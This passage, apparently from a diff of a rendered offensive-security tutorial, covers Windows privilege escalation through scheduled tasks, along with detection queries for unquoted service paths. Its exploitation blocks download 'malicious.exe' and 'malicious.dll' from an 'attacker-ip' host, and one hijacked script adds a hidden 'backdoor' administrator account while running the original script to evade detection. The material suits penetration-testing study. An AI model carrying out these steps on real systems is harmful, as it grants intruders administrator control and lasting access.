+    </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="mitigation-and-detection">Mitigation and Detection</h3>
+
+<p><strong>Security best practices:</strong></p>
+<ul>
+  <li>Always quote service paths with spaces</li>
+  <li>Implement proper directory permissions</li>
+  <li>Regular service configuration auditing</li>
+  <li>Use least privilege service accounts</li>
+</ul>
+
+<p><strong>Detection queries:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Audit all services for unquoted paths</span><span class="w">
+</span><span class="n">Get-CimInstance</span><span class="w"> </span><span class="nx">win32_service</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="bp">$_</span><span class="o">.</span><span class="nf">PathName</span><span class="w"> </span><span class="o">-and</span><span class="w"> 
+    </span><span class="bp">$_</span><span class="o">.</span><span class="nf">PathName</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"* *"</span><span class="w"> </span><span class="o">-and</span><span class="w"> 
+    </span><span class="bp">$_</span><span class="o">.</span><span class="nf">PathName</span><span class="w"> </span><span class="o">-notlike</span><span class="w"> </span><span class="s1">'"*'</span><span class="w">
+</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">PathName</span><span class="p">,</span><span class="w"> </span><span class="nx">StartName</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Export-Csv</span><span class="w"> </span><span class="nx">UnquotedServices.csv</span><span class="w">
+
+</span><span class="c"># Monitor for suspicious service binaries</span><span class="w">
+</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="s2">"C:\Program Files\"</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="s2">"*.exe"</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Directory</span><span class="o">.</span><span class="nf">Name</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">BaseName</span><span class="w">
+</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nx">FullName</span><span class="p">,</span><span class="w"> </span><span class="nx">CreationTime</span><span class="p">,</span><span class="w"> </span><span class="nx">LastWriteTime</span><span class="w">
+</span></code></pre></div></div>
+
+<h1 id="3-abusing-other-windows-components">3. Abusing Other Windows Components</h1>
+
+<p>Beyond services, Windows offers additional attack surfaces through scheduled tasks and system exploits. This section covers privilege escalation through task scheduler abuse and various exploit categories.</p>
+
+<h2 id="31-scheduled-tasks">3.1 Scheduled Tasks</h2>
+
+<p>Windows Task Scheduler executes automated tasks based on triggers. These tasks can be exploited for privilege escalation when they run with elevated privileges but have weak file permissions.</p>
+
+<h3 id="task-enumeration">Task Enumeration</h3>
+
+<p><strong>List all scheduled tasks:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Detailed task information</span><span class="w">
+</span><span class="n">schtasks</span><span class="w"> </span><span class="nx">/query</span><span class="w"> </span><span class="nx">/fo</span><span class="w"> </span><span class="nx">LIST</span><span class="w"> </span><span class="nx">/v</span><span class="w">
+
+</span><span class="c"># PowerShell cmdlet</span><span class="w">
+</span><span class="n">Get-ScheduledTask</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">TaskName</span><span class="p">,</span><span class="w"> </span><span class="nx">State</span><span class="p">,</span><span class="w"> </span><span class="nx">Author</span><span class="p">,</span><span class="w"> </span><span class="p">@{</span><span class="nx">Name</span><span class="o">=</span><span class="s2">"RunAsUser"</span><span class="p">;</span><span class="nx">Expression</span><span class="o">=</span><span class="p">{(</span><span class="n">Get-ScheduledTask</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">TaskName</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-ScheduledTaskInfo</span><span class="p">)</span><span class="o">.</span><span class="nf">RunAsUser</span><span class="p">}}</span><span class="w">
+
+</span><span class="c"># Filter for enabled tasks</span><span class="w">
+</span><span class="nx">Get</span><span class="err">-</span><span class="nx">ScheduledTask</span><span class="w"> </span><span class="err">|</span><span class="w"> </span><span class="nx">Where</span><span class="err">-</span><span class="nx">Object</span><span class="w"> </span><span class="nx">State</span><span class="w"> </span><span class="err">-</span><span class="nx">eq</span><span class="w"> </span><span class="s2">"Ready"</span><span class="w"> </span><span class="err">|</span><span class="w"> </span><span class="nx">Select</span><span class="err">-</span><span class="nx">Object</span><span class="w"> </span><span class="nx">TaskName</span><span class="p">,</span><span class="w"> </span><span class="nx">TaskPath</span><span class="p">,</span><span class="w"> </span><span class="nx">Author</span><span class="w">
+
+</span><span class="c"># Get task details</span><span class="w">
+</span><span class="nx">Get</span><span class="err">-</span><span class="nx">ScheduledTask</span><span class="w"> </span><span class="err">-</span><span class="nx">TaskName</span><span class="w"> </span><span class="s2">"TaskName"</span><span class="w"> </span><span class="err">|</span><span class="w"> </span><span class="nx">Get</span><span class="err">-</span><span class="nx">ScheduledTaskInfo</span><span class="w">
+</span><span class="nx">Get</span><span class="err">-</span><span class="nx">ScheduledTask</span><span class="w"> </span><span class="err">-</span><span class="nx">TaskName</span><span class="w"> </span><span class="s2">"TaskName"</span><span class="w"> </span><span class="err">|</span><span class="w"> </span><span class="nx">Get</span><span class="err">-</span><span class="nx">ScheduledTaskAction</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Find tasks running as privileged users:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Tasks running as SYSTEM or Administrator</span><span class="w">
+</span><span class="n">schtasks</span><span class="w"> </span><span class="nx">/query</span><span class="w"> </span><span class="nx">/fo</span><span class="w"> </span><span class="nx">LIST</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">/B</span><span class="w"> </span><span class="nx">/C:</span><span class="s2">"TaskName"</span><span class="w"> </span><span class="nx">/C:</span><span class="s2">"Run As User"</span><span class="w">
+
+</span><span class="c"># PowerShell filtering</span><span class="w">
+</span><span class="n">Get-ScheduledTask</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nv">$task</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$_</span><span class="w">
+    </span><span class="nv">$info</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-ScheduledTaskInfo</span><span class="w"> </span><span class="nv">$task</span><span class="o">.</span><span class="nf">TaskName</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$info</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="p">(</span><span class="nv">$info</span><span class="o">.</span><span class="nf">RunAsUser</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"*admin*"</span><span class="w"> </span><span class="o">-or</span><span class="w"> </span><span class="nv">$info</span><span class="o">.</span><span class="nf">RunAsUser</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"*system*"</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="p">[</span><span class="n">PSCustomObject</span><span class="p">]@{</span><span class="w">
+            </span><span class="nx">TaskName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$task</span><span class="err">.</span><span class="nx">TaskName</span><span class="w">
+            </span><span class="nx">State</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$task</span><span class="err">.</span><span class="nx">State</span><span class="w">
+            </span><span class="nx">RunAsUser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$info</span><span class="err">.</span><span class="nx">RunAsUser</span><span class="w">
+            </span><span class="nx">Actions</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">(</span><span class="nx">Get</span><span class="err">-</span><span class="nx">ScheduledTaskAction</span><span class="w"> </span><span class="nv">$task</span><span class="err">.</span><span class="nx">TaskName</span><span class="w"> </span><span class="err">-</span><span class="nx">ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="err">).</span><span class="nx">Execute</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="key-analysis-points">Key Analysis Points</h3>
+
+<p><strong>Critical information to extract:</strong></p>
+<ol>
+  <li><strong>Principal (Run As User)</strong> - Which account executes the task</li>
+  <li><strong>Triggers</strong> - When/how the task is executed</li>
+  <li><strong>Actions</strong> - What programs/scripts are executed</li>
+</ol>
+
+<p><strong>Essential fields to analyze:</strong></p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">Run As User</code> - Target privilege level</li>
+  <li><code class="language-plaintext highlighter-rouge">Task To Run</code> - Executable/script path</li>
+  <li><code class="language-plaintext highlighter-rouge">Next Run Time</code> - When task will execute</li>
+  <li><code class="language-plaintext highlighter-rouge">Schedule Type</code> - Frequency of execution</li>
+  <li><code class="language-plaintext highlighter-rouge">Author</code> - Who created the task</li>
+</ul>
+
+<h3 id="advanced-task-analysis">Advanced Task Analysis</h3>
+
+<p><strong>Detailed task inspection:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Export all task details</span><span class="w">
+</span><span class="n">Get-ScheduledTask</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nv">$taskName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">TaskName</span><span class="w">
+    </span><span class="nv">$task</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-ScheduledTask</span><span class="w"> </span><span class="nv">$taskName</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+    </span><span class="nv">$info</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-ScheduledTaskInfo</span><span class="w"> </span><span class="nv">$taskName</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+    </span><span class="nv">$actions</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-ScheduledTaskAction</span><span class="w"> </span><span class="nv">$taskName</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+    </span><span class="nv">$triggers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-ScheduledTaskTrigger</span><span class="w"> </span><span class="nv">$taskName</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+    
+    </span><span class="p">[</span><span class="n">PSCustomObject</span><span class="p">]@{</span><span class="w">
+        </span><span class="nx">TaskName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$taskName</span><span class="w">
+        </span><span class="nx">State</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$task</span><span class="err">.</span><span class="nx">State</span><span class="w">
+        </span><span class="nx">Author</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$task</span><span class="err">.</span><span class="nx">Author</span><span class="w">
+        </span><span class="nx">RunAsUser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$info</span><span class="err">.</span><span class="nx">RunAsUser</span><span class="w">
+        </span><span class="nx">NextRun</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$info</span><span class="err">.</span><span class="nx">NextRunTime</span><span class="w">
+        </span><span class="nx">LastRun</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$info</span><span class="err">.</span><span class="nx">LastRunTime</span><span class="w">
+        </span><span class="nx">Actions</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">(</span><span class="nv">$actions</span><span class="w"> </span><span class="err">|</span><span class="w"> </span><span class="nx">ForEach</span><span class="err">-</span><span class="nx">Object</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s2">"</span><span class="si">$(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Execute</span><span class="si">)</span><span class="s2"> </span><span class="si">$(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Arguments</span><span class="si">)</span><span class="s2">"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="err">-</span><span class="nx">join</span><span class="w"> </span><span class="s2">"; "</span><span class="w">
+        </span><span class="nx">Triggers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">(</span><span class="nv">$triggers</span><span class="w"> </span><span class="err">|</span><span class="w"> </span><span class="nx">ForEach</span><span class="err">-</span><span class="nx">Object</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">ToString</span><span class="p">()</span><span class="w"> </span><span class="p">})</span><span class="w"> </span><span class="o">-join</span><span class="w"> </span><span class="s2">"; "</span><span class="w">
+        </span><span class="n">WorkingDirectory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$actions</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nf">WorkingDirectory</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Export-Csv</span><span class="w"> </span><span class="nx">ScheduledTasks.csv</span><span class="w"> </span><span class="nt">-NoTypeInformation</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Filter for exploitable tasks:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Tasks with writable executables</span><span class="w">
+</span><span class="n">Get-ScheduledTask</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nv">$actions</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-ScheduledTaskAction</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">TaskName</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+    </span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$action</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$actions</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$action</span><span class="o">.</span><span class="nf">Execute</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="p">(</span><span class="n">Test-Path</span><span class="w"> </span><span class="nv">$action</span><span class="o">.</span><span class="nf">Execute</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+            </span><span class="nv">$acl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Acl</span><span class="w"> </span><span class="nv">$action</span><span class="o">.</span><span class="nf">Execute</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+            </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$acl</span><span class="o">.</span><span class="nf">Access</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
+                </span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReference</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"BUILTIN\Users"</span><span class="w"> </span><span class="o">-and</span><span class="w"> 
+                </span><span class="bp">$_</span><span class="o">.</span><span class="nf">FileSystemRights</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"FullControl|Modify|Write"</span><span class="w">
+            </span><span class="p">})</span><span class="w"> </span><span class="p">{</span><span class="w">
+                </span><span class="p">[</span><span class="n">PSCustomObject</span><span class="p">]@{</span><span class="w">
+                    </span><span class="nx">TaskName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$_</span><span class="err">.</span><span class="nx">TaskName</span><span class="w">
+                    </span><span class="nx">Executable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$action</span><span class="err">.</span><span class="nx">Execute</span><span class="w">
+                    </span><span class="nx">Writable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$true</span><span class="w">
+                    </span><span class="nx">RunAsUser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">(</span><span class="nx">Get</span><span class="err">-</span><span class="nx">ScheduledTaskInfo</span><span class="w"> </span><span class="bp">$_</span><span class="err">.</span><span class="nx">TaskName</span><span class="err">).</span><span class="nx">RunAsUser</span><span class="w">
+                </span><span class="p">}</span><span class="w">
+            </span><span class="p">}</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="permission-analysis-2">Permission Analysis</h3>
+
+<p><strong>Check executable permissions:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Analyze task executable permissions</span><span class="w">
+</span><span class="kr">function</span><span class="w"> </span><span class="nf">Test-TaskExecutablePermissions</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="kr">param</span><span class="p">(</span><span class="nv">$TaskName</span><span class="p">)</span><span class="w">
+    
+    </span><span class="nv">$actions</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-ScheduledTaskAction</span><span class="w"> </span><span class="nv">$TaskName</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+    </span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$action</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$actions</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$action</span><span class="o">.</span><span class="nf">Execute</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+            </span><span class="n">Write-Output</span><span class="w"> </span><span class="s2">"Checking: </span><span class="si">$(</span><span class="nv">$action</span><span class="o">.</span><span class="nf">Execute</span><span class="si">)</span><span class="s2">"</span><span class="w">
+            </span><span class="n">icacls</span><span class="w"> </span><span class="nv">$action</span><span class="o">.</span><span class="nf">Execute</span><span class="w">
+            
+            </span><span class="c"># Check if current user can modify</span><span class="w">
+            </span><span class="nv">$acl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Acl</span><span class="w"> </span><span class="nv">$action</span><span class="o">.</span><span class="nf">Execute</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+            </span><span class="nv">$currentUser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Security.Principal.WindowsIdentity</span><span class="p">]::</span><span class="n">GetCurrent</span><span class="p">()</span><span class="o">.</span><span class="nf">Name</span><span class="w">
+            
+            </span><span class="nv">$hasWriteAccess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$acl</span><span class="o">.</span><span class="nf">Access</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
+                </span><span class="p">(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReference</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$currentUser</span><span class="w"> </span><span class="o">-or</span><span class="w"> 
+                 </span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReference</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"BUILTIN\Users"</span><span class="w"> </span><span class="o">-or</span><span class="w">
+                 </span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReference</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"NT AUTHORITY\Authenticated Users"</span><span class="p">)</span><span class="w"> </span><span class="o">-and</span><span class="w">
+                </span><span class="p">(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">FileSystemRights</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"FullControl|Modify|Write"</span><span class="p">)</span><span class="w">
+            </span><span class="p">}</span><span class="w">
+            
+            </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$hasWriteAccess</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+                </span><span class="n">Write-Output</span><span class="w"> </span><span class="s2">"WRITABLE: </span><span class="si">$(</span><span class="nv">$action</span><span class="o">.</span><span class="nf">Execute</span><span class="si">)</span><span class="s2">"</span><span class="w">
+            </span><span class="p">}</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="c"># Test specific task</span><span class="w">
+</span><span class="n">Test-TaskExecutablePermissions</span><span class="w"> </span><span class="s2">"TaskName"</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Directory permission analysis:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check if task executable directory is writable</span><span class="w">
+</span><span class="n">Get-ScheduledTask</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nv">$actions</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-ScheduledTaskAction</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">TaskName</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+    </span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$action</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$actions</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$action</span><span class="o">.</span><span class="nf">Execute</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+            </span><span class="nv">$directory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Split-Path</span><span class="w"> </span><span class="nv">$action</span><span class="o">.</span><span class="nf">Execute</span><span class="w"> </span><span class="nt">-Parent</span><span class="w">
+            </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$directory</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="p">(</span><span class="n">Test-Path</span><span class="w"> </span><span class="nv">$directory</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+                </span><span class="nv">$acl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Acl</span><span class="w"> </span><span class="nv">$directory</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+                </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$acl</span><span class="o">.</span><span class="nf">Access</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
+                    </span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReference</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"BUILTIN\Users"</span><span class="w"> </span><span class="o">-and</span><span class="w"> 
+                    </span><span class="bp">$_</span><span class="o">.</span><span class="nf">FileSystemRights</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"Write|FullControl"</span><span class="w">
+                </span><span class="p">})</span><span class="w"> </span><span class="p">{</span><span class="w">
+                    </span><span class="n">Write-Output</span><span class="w"> </span><span class="s2">"Writable directory: </span><span class="nv">$directory</span><span class="s2"> for task </span><span class="si">$(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">TaskName</span><span class="si">)</span><span class="s2">"</span><span class="w">
+                </span><span class="p">}</span><span class="w">
+            </span><span class="p">}</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="exploitation-techniques">Exploitation Techniques</h3>
+
+<p><strong>Binary replacement method:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 1. Backup original executable</span><span class="w">
+</span><span class="nv">$taskAction</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-ScheduledTaskAction</span><span class="w"> </span><span class="s2">"VulnerableTask"</span><span class="w">
+</span><span class="nv">$originalExe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$taskAction</span><span class="o">.</span><span class="nf">Execute</span><span class="w">
+</span><span class="n">Copy-Item</span><span class="w"> </span><span class="nv">$originalExe</span><span class="w"> </span><span class="s2">"</span><span class="nv">$originalExe</span><span class="s2">.backup"</span><span class="w">
+
+</span><span class="c"># 2. Replace with malicious binary (use standard payload from section 2.1)</span><span class="w">
+</span><span class="n">iwr</span><span class="w"> </span><span class="nt">-uri</span><span class="w"> </span><span class="nx">http://attacker-ip/malicious.exe</span><span class="w"> </span><span class="nt">-Outfile</span><span class="w"> </span><span class="nx">malicious.exe</span><span class="w">
+</span><span class="n">Move-Item</span><span class="w"> </span><span class="nx">malicious.exe</span><span class="w"> </span><span class="nv">$originalExe</span><span class="w">
+
+</span><span class="c"># 3. Wait for task execution or trigger manually</span><span class="w">
+</span><span class="n">Start-ScheduledTask</span><span class="w"> </span><span class="s2">"VulnerableTask"</span><span class="w">
+
+</span><span class="c"># 4. Verify privilege escalation (see section 1.2 for enumeration)</span><span class="w">
+</span><span class="n">Get-LocalUser</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="nx">Name</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"newuser"</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Script hijacking method:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># For tasks executing scripts</span><span class="w">
+</span><span class="nv">$scriptPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\Scripts\cleanup.ps1"</span><span class="w">
+
+</span><span class="c"># Backup original script</span><span class="w">
+</span><span class="n">Copy-Item</span><span class="w"> </span><span class="nv">$scriptPath</span><span class="w"> </span><span class="s2">"</span><span class="nv">$scriptPath</span><span class="s2">.backup"</span><span class="w">
+
+</span><span class="c"># Create malicious script (using standard payload pattern)</span><span class="w">
+</span><span class="nv">$maliciousScript</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sh">@"
+# Add user and grant admin privileges (standard pattern from section 2.1)
+net user backdoor Password123! /add
+net localgroup administrators backdoor /add
+
+# Execute original functionality to avoid detection
+&amp; "</span><span class="nv">$scriptPath</span><span class="sh">.backup"
+"@</span><span class="w">
+
+</span><span class="nv">$maliciousScript</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-File</span><span class="w"> </span><span class="nv">$scriptPath</span><span class="w"> </span><span class="nt">-Encoding</span><span class="w"> </span><span class="nx">ASCII</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="advanced-exploitation">Advanced Exploitation</h3>
+
+<p><strong>DLL hijacking in scheduled tasks:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># If task executable loads DLLs from its directory</span><span class="w">
+</span><span class="nv">$taskPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\Program Files\Application\"</span><span class="w">
+
+</span><span class="c"># Check for missing DLLs using Process Monitor</span><span class="w">
+</span><span class="c"># Create malicious DLL and place in application directory</span><span class="w">
+</span><span class="n">iwr</span><span class="w"> </span><span class="nt">-uri</span><span class="w"> </span><span class="nx">http://attacker-ip/malicious.dll</span><span class="w"> </span><span class="nt">-Outfile</span><span class="w"> </span><span class="s2">"</span><span class="nv">$taskPath</span><span class="s2">\missing.dll"</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Argument injection:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># If task uses user-controllable arguments</span><span class="w">
+</span><span class="nv">$task</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-ScheduledTask</span><span class="w"> </span><span class="s2">"VulnerableTask"</span><span class="w">
+</span><span class="nv">$action</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-ScheduledTaskAction</span><span class="w"> </span><span class="nv">$task</span><span class="o">.</span><span class="nf">TaskName</span><span class="w">
+
